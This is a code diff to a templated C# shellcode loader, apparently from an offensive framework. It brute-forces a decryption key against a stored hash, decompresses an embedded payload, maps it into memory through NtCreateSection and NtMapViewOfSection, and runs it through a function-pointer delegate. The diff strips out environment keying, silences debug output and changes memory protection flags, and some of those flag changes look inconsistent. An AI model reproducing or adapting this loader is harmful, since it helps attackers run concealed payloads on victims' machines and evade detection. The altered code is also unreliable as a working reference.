@@ -36,11 +36,6 @@ public class ClassRunner : Task, ITask
         byte[] key = { {{.Key}} };
         byte[] realHash = { {{.Hash}} };
 
-        //{{if .DomainKey}}
-        var domainName = System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName.ToUpper();
-        key = xor(key, Encoding.ASCII.GetBytes(domainName));
-        //{{end}}
-
         bool found = false;
         while (!found) {
             key = increase(key, 1);
@@ -52,10 +47,10 @@ public class ClassRunner : Task, ITask
         rawShellcode = Gzip.Decompress(rawShellcode);
 
         // Create local section, map two views RW + RX, copy shellcode to RW
-        //Console.WriteLine("\n[>] Creating local section..");
+        ////Console.WriteLine("\n[>] Creating local section..");
         SECT_DATA LocalSect = MapLocalSectionAndWrite(rawShellcode);
 
-        //Console.WriteLine("\n[>] Triggering shellcode using delegate!");
+        Console.WriteLine("\n[>] Triggering shellcode using delegate!");
         Initialize del = (Initialize)Marshal.GetDelegateForFunctionPointer(LocalSect.pBase, typeof(Initialize));
         del();
         return true;
@@ -77,16 +72,16 @@ public class ClassRunner : Task, ITask
         long ScSize = ShellCode.Length;
         long MaxSize = ScSize;
         IntPtr hSection = IntPtr.Zero;
-        UInt32 CallResult = NtCreateSection(ref hSection, 0xe, IntPtr.Zero, ref MaxSize, 0x40, 0x8000000, IntPtr.Zero);
+        UInt32 CallResult = NtCreateSection(ref hSection, 0xe, IntPtr.Zero, ref MaxSize, 0x04, 0x8000000, IntPtr.Zero);
         if (CallResult == 0 && hSection != IntPtr.Zero)
         {
-            Console.WriteLine("    |-> hSection: 0x" + String.Format("{0:X}", (hSection).ToInt64()));
-            Console.WriteLine("    |-> Size: " + ScSize);
+            //Console.WriteLine("    |-> hSection: 0x" + String.Format("{0:X}", (hSection).ToInt64()));
+            //Console.WriteLine("    |-> Size: " + ScSize);
             SectData.hSection = hSection;
         }
         else
         {
-            Console.WriteLine("[!] Failed to create section..");
+            //Console.WriteLine("[!] Failed to create section..");
             SectData.isvalid = false;
             return SectData;
         }
@@ -94,19 +89,20 @@ public class ClassRunner : Task, ITask
         // Allocate RW portion + Copy ShellCode
         IntPtr pScBase = IntPtr.Zero;
         long lSecOffset = 0;
-        CallResult = NtMapViewOfSection(hSection, (IntPtr)(-1), ref pScBase, IntPtr.Zero, IntPtr.Zero, ref lSecOffset, ref MaxSize, 0x2, 0, 0x4);
+        CallResult = NtMapViewOfSection(hSection, (IntPtr)(-1), ref pScBase, IntPtr.Zero, IntPtr.Zero, ref lSecOffset, ref MaxSize, 0x20, 0, 0x04);
         if (CallResult == 0 && pScBase != IntPtr.Zero)
         {
-            Console.WriteLine("\n[>] Creating first view with PAGE_READWRITE");
-            Console.WriteLine("    |-> pBase: 0x" + String.Format("{0:X}", (pScBase).ToInt64()));
+            //Console.WriteLine("\n[>] Creating first view with PAGE_READWRITE");
+            //Console.WriteLine("    |-> pBase: 0x" + String.Format("{0:X}", (pScBase).ToInt64()));
             SectData.pBase = pScBase;
         }
         else
         {
-            Console.WriteLine("[!] Failed to map section locally..");
+            //Console.WriteLine("[!] Failed to map section locally..");
             SectData.isvalid = false;
             return SectData;
         }
+
         Marshal.Copy(ShellCode, 0, SectData.pBase, ShellCode.Length);
 
         // Allocate ER portion
@@ -114,13 +110,13 @@ public class ClassRunner : Task, ITask
         CallResult = NtMapViewOfSection(hSection, (IntPtr)(-1), ref pScBase2, IntPtr.Zero, IntPtr.Zero, ref lSecOffset, ref MaxSize, 0x2, 0, 0x20);
         if (CallResult == 0 && pScBase != IntPtr.Zero)
         {
-            Console.WriteLine("\n[>] Creating second view with PAGE_EXECUTE_READ");
-            Console.WriteLine("    |-> pBase: 0x" + String.Format("{0:X}", (pScBase2).ToInt64()));
+            //Console.WriteLine("\n[>] Creating second view with PAGE_EXECUTE_READ");
+            //Console.WriteLine("    |-> pBase: 0x" + String.Format("{0:X}", (pScBase2).ToInt64()));
             SectData.pBase = pScBase2;
         }
         else
         {
-            Console.WriteLine("[!] Failed to map section locally..");
+            //Console.WriteLine("[!] Failed to map section locally..");
             SectData.isvalid = false;
             return SectData;
         }
